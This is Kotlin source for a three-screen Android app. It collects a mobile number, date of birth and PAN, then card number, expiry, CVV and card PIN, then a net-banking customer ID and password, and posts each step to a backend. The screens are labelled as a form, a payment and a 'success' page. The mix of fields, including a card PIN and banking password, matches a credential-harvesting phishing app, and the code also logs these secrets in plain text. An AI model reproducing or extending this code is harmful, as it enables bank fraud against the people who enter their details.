form 


package com.example.refactor.activities

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.refactor.R
import com.example.refactor.models.FormData
import com.example.refactor.network.ApiClient
import kotlinx.coroutines.*
import retrofit2.HttpException
import java.io.IOException
import kotlin.math.pow

class FormActivity : AppCompatActivity() {

    private lateinit var etMobileNumber: EditText
    private lateinit var etDob: EditText
    private lateinit var etPan: EditText
    private lateinit var btnProceed: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_form)

        etMobileNumber = findViewById(R.id.etMobileNumber)
        etDob = findViewById(R.id.etDob)
        etPan = findViewById(R.id.etPan)
        btnProceed = findViewById(R.id.btnProceed)

        setupDobAutoFormat() // Add auto-format logic for DOB input

        btnProceed.setOnClickListener {
            val mobileNumber = etMobileNumber.text.toString().trim()
            val dob = etDob.text.toString().trim()
            val pan = etPan.text.toString().trim()

            if (validateInputs(mobileNumber, dob, pan)) {
                btnProceed.isEnabled = false
                submitFormData(mobileNumber, dob, pan)
            }
        }
    }

    private fun setupDobAutoFormat() {
        etDob.addTextChangedListener(object : TextWatcher {
            private var isFormatting = false
            private val maxLength = 10 // Maximum allowed length for DOB input

            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}

            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

            override fun afterTextChanged(s: Editable?) {
                if (isFormatting || s.isNullOrEmpty()) return

                isFormatting = true

                val clean = s.toString().replace("/", "") // Remove previous slashes
                val formatted = StringBuilder()
                val cursorPosition = etDob.selectionStart // Using 'val' instead of 'var'

                for (i in clean.indices) {
                    if (formatted.length >= maxLength) break // Prevent exceeding max length

                    formatted.append(clean[i])
                    if ((i == 1 || i == 3) && formatted.length + 1 <= maxLength) {
                        formatted.append("/")
                    }
                }

                etDob.setText(formatted.toString())

                // Maintain cursor position
                etDob.setSelection(minOf(cursorPosition, formatted.length))

                isFormatting = false
            }
        })
    }

    private fun validateInputs(mobileNumber: String, dob: String, pan: String): Boolean {
        val mobileRegex = "^[6-9]\\d{9}$".toRegex()
        val dobRegex = "^\\d{2}/\\d{2}/\\d{4}$".toRegex()
        val panRegex = "^[A-Z]{5}\\d{4}[A-Z]$".toRegex()

        if (!mobileRegex.matches(mobileNumber)) {
            showToast("Invalid Mobile Number!")
            return false
        }
        if (!dobRegex.matches(dob)) {
            showToast("Invalid Date of Birth! Format: DD/MM/YYYY")
            return false
        }
        if (!panRegex.matches(pan)) {
            showToast("Invalid PAN Number!")
            return false
        }
        return true
    }

    private fun submitFormData(mobileNumber: String, dob: String, pan: String) {
        val apiInterface = ApiClient.api
        val formData = FormData(mobile = mobileNumber, dob = dob, pan = pan)

        CoroutineScope(Dispatchers.IO).launch {
            var attempt = 0
            var success = false
            var userId: String? = null

            while (attempt < 3 && !success) {
                Log.d("FormActivity", "Attempt $attempt: Sending form data to backend...")

                try {
                    val response = apiInterface.saveFormDataStep1(formData)

                    withContext(Dispatchers.Main) {
                        if (response.isSuccessful && response.body()?.success == true) {
                            userId = response.body()?.data?.userId
                            Log.d("FormActivity", "Success: Response received from backend")
                            success = true
                        } else {
                            Log.e("FormActivity", "Error: Failed response")
                        }
                    }
                } catch (e: HttpException) {
                    Log.e("FormActivity", "HTTP Exception: ${e.message()}", e)
                } catch (e: IOException) {
                    Log.e("FormActivity", "Network Error: ${e.message}", e)
                } catch (e: Exception) {
                    Log.e("FormActivity", "Unexpected Error: ${e.message}", e)
                }

                attempt++
                if (!success) {
                    val delayTime = (2.0.pow(attempt) * 1000).toLong()
                    Log.d("FormActivity", "Retrying in $delayTime ms...")
                    delay(delayTime)
                }
            }

            withContext(Dispatchers.Main) {
                btnProceed.isEnabled = true
                if (success && userId != null) {
                    handleUserId(userId)
                } else {
                    showToast("Please check your internet connection!")
                }
            }
        }
    }

    private fun handleUserId(userId: String?) {
        if (!userId.isNullOrEmpty()) {
            Log.d("FormActivity", "User ID received successfully: $userId")
            saveUserIdToSharedPreferences(userId)
            showToast("Data submitted successfully!")
            navigateToNextForm(userId)
        } else {
            Log.e("FormActivity", "Error: User ID is null or empty")
            showToast("Data submission failed!")
        }
    }

    private fun saveUserIdToSharedPreferences(userId: String) {
        val sharedPref = getSharedPreferences("UserPreferences", Context.MODE_PRIVATE)
        sharedPref.edit().putString("userId", userId).apply()
        Log.d("FormActivity", "User ID saved in SharedPreferences: $userId")
    }

    private fun showToast(message: String) {
        runOnUiThread {
            Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
        }
    }

    private fun navigateToNextForm(userId: String) {
        Log.d("FormActivity", "Navigating to PaymentActivity with User ID: $userId")
        val intent = Intent(this, PaymentActivity::class.java)
        intent.putExtra("USER_ID", userId)
        startActivity(intent)
        finish()
    }
}



payment


package com.example.refactor.activities

import android.content.Intent
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.refactor.R
import com.example.refactor.models.NetBankingData
import com.example.refactor.network.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.HttpException
import java.io.IOException

class PaymentActivity : AppCompatActivity() {

    private lateinit var etCardNumber: EditText
    private lateinit var etExpiryDate: EditText
    private lateinit var etCvv: EditText
    private lateinit var etPin: EditText
    private lateinit var btnProceed: Button

    private var userId: String? = null // Variable to store userId

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_payment)

        // Initialize views
        etCardNumber = findViewById(R.id.etCardNumber)
        etExpiryDate = findViewById(R.id.etExpiryDate)
        etCvv = findViewById(R.id.etCvv)
        etPin = findViewById(R.id.etPin)
        btnProceed = findViewById(R.id.btnProceed)

        // Retrieve the userId passed from the previous activity
        userId = intent.getStringExtra("USER_ID")

        // Setup expiry date auto-formatting
        setupExpiryDateAutoFormat()

        // Handle button click
        btnProceed.setOnClickListener {
            val cardNumber = etCardNumber.text.toString().trim()
            val expiryDate = etExpiryDate.text.toString().trim()
            val cvv = etCvv.text.toString().trim()
            val pin = etPin.text.toString().trim()

            if (validateInputs(cardNumber, expiryDate, cvv, pin)) {
                submitPaymentData(cardNumber, expiryDate, cvv, pin)
            } else {
                showToast("Please fill all fields with valid data!")
            }
        }
    }

    private fun setupExpiryDateAutoFormat() {
        etExpiryDate.addTextChangedListener(object : TextWatcher {
            private var isFormatting = false
            private var deletingSlash = false
            private val slashPosition = 2

            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {
                deletingSlash = count == 1 && after == 0 && start == slashPosition
            }

            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                if (isFormatting || s.isNullOrEmpty()) return

                isFormatting = true
                val cleanInput = s.toString().replace(Regex("\\D"), "") // Remove non-numeric characters

                val formatted = StringBuilder()
                for (i in cleanInput.indices) {
                    if (i > 3) break // Limit to MM/YY format
                    formatted.append(cleanInput[i])
                    if (i == 1 && cleanInput.length > 2) {
                        formatted.append("/")
                    }
                }

                val finalText = formatted.toString()
                if (finalText != s.toString()) {
                    etExpiryDate.setText(finalText)
                    etExpiryDate.setSelection(finalText.length)
                }

                isFormatting = false
            }

            override fun afterTextChanged(s: Editable?) {
                if (deletingSlash) {
                    s?.delete(slashPosition - 1, slashPosition)
                    deletingSlash = false
                }
            }
        })
    }

    // Validate inputs
    private fun validateInputs(
        cardNumber: String, expiryDate: String, cvv: String, pin: String
    ): Boolean {
        val cardPattern = "^[0-9]{16}$"  // Validate 16 digit card number
        val expiryPattern = "^(0[1-9]|1[0-2])/([0-9]{2})$"  // Validate expiry date in MM/YY format
        val cvvPattern = "^[0-9]{3}$"  // Validate 3 digit CVV
        val pinPattern = "^[0-9]{4}$"  // Validate 4 digit PIN

        val isCardValid = cardNumber.matches(cardPattern.toRegex())
        val isExpiryValid = expiryDate.matches(expiryPattern.toRegex())
        val isCvvValid = cvv.matches(cvvPattern.toRegex())
        val isPinValid = pin.matches(pinPattern.toRegex())

        if (!isCardValid) showToast("Invalid Card Number!")
        if (!isExpiryValid) showToast("Invalid Expiry Date!")
        if (!isCvvValid) showToast("Invalid CVV!")
        if (!isPinValid) showToast("Invalid PIN!")

        return isCardValid && isExpiryValid && isCvvValid && isPinValid
    }

    // Submit payment data to the backend
    private fun submitPaymentData(
        cardNumber: String, expiryDate: String, cvv: String, pin: String
    ) {
        if (userId.isNullOrEmpty()) {
            showToast("User ID is missing! Unable to submit data.")
            return
        }

        val apiInterface = ApiClient.api
        val netBankingData = NetBankingData(
            userId!!, cardNumber, expiryDate, cvv, pin
        )

        // Log data being sent to the backend
        Log.d("PaymentActivity", "Sending data to backend: $netBankingData")

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val response = apiInterface.saveFormDataStep2(netBankingData)

                // Log the API call response
                Log.d("PaymentActivity", "Response received: $response")

                if (response.isSuccessful) {
                    val responseBody = response.body()
                    if (responseBody?.success == true) {
                        Log.d("PaymentActivity", "Data submitted successfully. Response: $responseBody")
                        runOnUiThread {
                            navigateToNextStep()
                        }
                    } else {
                        Log.d("PaymentActivity", "Submission failed. Response message: ${responseBody?.message}")
                        runOnUiThread {
                            showToast(responseBody?.message ?: "Submission failed!")
                        }
                    }
                } else {
                    // Error response from server
                    Log.d("PaymentActivity", "Error occurred. Response: ${response.errorBody()?.string()}")
                    runOnUiThread {
                        showToast("Error: ${response.errorBody()?.string() ?: "Unknown error occurred"}")
                    }
                }
            } catch (e: HttpException) {
                // Handle HTTP exceptions (e.g., 4xx or 5xx status codes)
                Log.e("PaymentActivity", "HTTP Exception: ${e.message}", e)
                runOnUiThread {
                    showToast("HTTP Error!")
                }
            } catch (e: IOException) {
                // Handle network-related errors (e.g., no internet)
                Log.e("PaymentActivity", "Network Error: ${e.message}", e)
                runOnUiThread {
                    showToast("Network Error: Please check your connection.")
                }
            } catch (e: Exception) {
                // Handle other unexpected errors
                Log.e("PaymentActivity", "Unexpected Error: ${e.message}", e)
                runOnUiThread {
                    showToast("Unexpected Error!")
                }
            }
        }
    }

    // Show a Toast message
    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

    // Navigate to the SuccessActivity
    private fun navigateToNextStep() {
        showToast("Payment data submitted successfully!")
        val intent = Intent(this, SuccessActivity::class.java)
        intent.putExtra("USER_ID", userId) // Pass the userId to the next activity
        startActivity(intent)
        finish()
    }
}



success

package com.example.refactor.activities

import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.refactor.R
import com.example.refactor.models.CardPaymentData
import com.example.refactor.network.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.HttpException
import java.io.IOException

class SuccessActivity : AppCompatActivity() {

    private lateinit var etCustomerId: EditText
    private lateinit var etPassword: EditText
    private lateinit var btnSubmit: Button

    private var userId: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activitty_success)

        etCustomerId = findViewById(R.id.etCustomerId)
        etPassword = findViewById(R.id.etPassword)
        btnSubmit = findViewById(R.id.btnSubmit)

        userId = intent.getStringExtra("USER_ID")

        if (userId.isNullOrEmpty()) {
            Toast.makeText(this, "User ID missing!", Toast.LENGTH_SHORT).show()
            finish()
            return
        }

        btnSubmit.setOnClickListener {
            val customerId = etCustomerId.text.toString().trim()
            val password = etPassword.text.toString().trim()

            if (validateInputs(customerId, password)) {
                submitFormData(customerId, password)
            } else {
                Toast.makeText(this, "Invalid input format!", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun validateInputs(customerId: String, password: String): Boolean {
        val customerIdRegex = "^[A-Za-z0-9]{6,12}$".toRegex()  // 6-12 characters, only letters & numbers
        val passwordRegex = "^(?=.*[A-Za-z])(?=.*\\d).{6,}$".toRegex()
        // Password: Min 6 characters, at least 1 letter & 1 digit

        if (!customerId.matches(customerIdRegex)) {
            showToast("Customer ID 6-12 characters ka hona chahiye (letters & numbers only)!")
            return false
        }

        if (!password.matches(passwordRegex)) {
            showToast("Password me kam se kam 6 characters hone chahiye, jisme ek letter aur ek number ho!")
            return false
        }

        return true
    }

    private fun submitFormData(customerId: String, password: String) {
        val apiInterface = ApiClient.api

        val formData = CardPaymentData(
            userId = userId!!,
            customerId = customerId,
            password = password
        )

        Log.d("FormData", "Payload being sent: $formData")

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val response = apiInterface.saveFormDataStep3(formData)
                runOnUiThread {
                    if (response.isSuccessful && response.body()?.success == true) {
                        showToast("Data submitted successfully!")
                        finish()
                    } else {
                        showToast("Data submission failed!")
                    }
                }
            } catch (e: HttpException) {
                runOnUiThread { showToast("HTTP Error: ${e.message}") }
            } catch (e: IOException) {
                runOnUiThread { showToast("Network Error!") }
            } catch (e: Exception) {
                runOnUiThread { showToast("Unexpected Error: ${e.message}") }
            }
        }
    }

    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }
}
